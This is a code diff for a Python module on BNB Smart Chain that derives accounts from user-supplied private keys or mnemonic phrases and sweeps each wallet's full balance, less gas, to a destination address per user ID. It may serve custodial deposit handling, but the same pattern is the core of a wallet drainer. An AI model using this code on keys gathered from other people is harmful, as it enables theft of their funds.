@@ -1,42 +1,68 @@
 from web3 import Web3
+from eth_account import Account
 from config import BSC_RPC_URL
+import time
+
+Account.enable_unaudited_hdwallet_features()
 
 w3 = Web3(Web3.HTTPProvider(BSC_RPC_URL))
 
-def forward(private_key: str, destination: str, user_id: int):
+CHAIN_ID = 56
+SYMBOL = "BNB"
+
+def get_account_from_secret(secret: str):
+    s = secret.strip()
+    if " " in s:
+        return Account.from_mnemonic(s)
+    return Account.from_key(s if s.startswith("0x") else "0x" + s)
+
+def get_balance(address: str) -> float:
     try:
-        account = w3.eth.account.from_key(private_key)
+        bal = w3.eth.get_balance(Web3.to_checksum_address(address))
+        return float(Web3.from_wei(bal, "ether"))
+    except Exception:
+        return 0.0
+
+def forward(secret: str, destination: str, user_id: int) -> dict:
+    result = {"chain": "bsc", "status": "skip", "amount": 0.0, "tx_hash": None, "error": None}
+    try:
+        account = get_account_from_secret(secret)
         address = account.address
+        dest = Web3.to_checksum_address(destination)
 
         balance = w3.eth.get_balance(address)
-
-        if balance <= 21000:
-            print(f"[BSC] Not enough balance user {user_id}")
-            return
-
         gas_price = w3.eth.gas_price
         gas_limit = 21000
         fee = gas_price * gas_limit
 
-        value = balance - fee
+        if balance <= fee:
+            result["error"] = f"Balance {Web3.from_wei(balance, 'ether')} BNB too low for gas"
+            return result
 
-        if value <= 0:
-            print(f"[BSC] Gas too high user {user_id}")
-            return
+        value = balance - fee
+        amount_bnb = float(Web3.from_wei(value, "ether"))
 
         tx = {
-            "to": destination,
+            "to": dest,
             "value": value,
             "gas": gas_limit,
             "gasPrice": gas_price,
-            "nonce": w3.eth.get_transaction_count(address),
-            "chainId": 56,
+            "nonce": w3.eth.get_transaction_count(address, "pending"),
+            "chainId": CHAIN_ID,
         }
 
-        signed_tx = account.sign_transaction(tx)
-        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+        signed = account.sign_transaction(tx)
+        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+        tx_hex = tx_hash.hex()
 
-        print(f"[BSC] Sent {tx_hash.hex()} user {user_id}")
+        result["status"] = "success"
+        result["amount"] = amount_bnb
+        result["tx_hash"] = tx_hex
+        print(f"[BSC] Swept {amount_bnb:.6f} BNB -> {dest[:10]}... tx={tx_hex[:16]}... user={user_id}")
+        return result
 
     except Exception as e:
-        print(f"[BSC ERROR] {user_id}: {e}")
+        result["status"] = "error"
+        result["error"] = str(e)
+        print(f"[BSC ERROR] user={user_id}: {e}")
+        return result
